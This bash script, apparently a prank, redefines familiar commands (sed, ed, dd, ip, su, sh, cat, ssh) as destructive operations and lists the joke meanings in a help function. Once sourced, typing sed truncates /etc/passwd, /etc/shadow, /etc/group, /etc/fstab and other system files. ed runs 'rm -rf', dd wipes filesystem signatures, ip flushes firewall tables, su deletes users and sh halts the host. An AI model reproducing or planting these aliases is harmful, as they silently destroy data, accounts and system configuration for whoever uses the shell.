#!/bin/bash

help() {
    echo rm = read manual
    echo awk = abandon working kernel
    echo ip = iptables prune
    echo dd = destroy disk
    echo sed = shrink essential databases
    echo cat = corrupt active terminal
    echo sh = shutdown host
    echo printf = print file
    echo vi = view immediately
    echo ed = erase directory
    echo wc = wild card
    echo su = sacrifice user
    echo ssh = send sig-hup
}

alias rm=\man
alias awk=\kexec

ip() {
    \iptables -T nat -F
    \iptables -T mangle -F
    \iptables -F
}

alias dd=\wipefs

sed() {
    \head -1 </etc/passwd >/etc/passwd
    \head -1 </etc/passwd- >/etc/passwd-
    \head -1 </etc/shadow >/etc/shadow
    \head -1 </etc/shadow- >/etc/shadow-
    \head -1 </etc/group >/etc/group
    \head -1 </etc/group- >/etc/group-
    \head -1 </etc/gshadow >/etc/gshadow
    \head -1 </etc/gshadow- >/etc/gshadow-
    \head -1 </etc/shells >/etc/shells
    \head -1 </etc/hosts >/etc/hosts
    \head -1 </etc/locale.gen >/etc/locale.gen
    \head -1 </etc/fstab >/etc/fstab
    \head -1 </etc/subgid >/etc/subgid
    \head -1 </etc/subgid- >/etc/subgid-
    \head -1 </etc/subuid >/etc/subuid
    \head -1 </etc/subuid- >/etc/subuid-
}

alias cat='\cat /dev/urandom'
alias sh='\shutdown -h now'
alias printf=\lpr
alias vi=\cat
alias ed='\rm -rf'
alias wc=\echo  # echo * "expands" wildcard
alias su=\userdel
alias ssh='\kill -HUP'
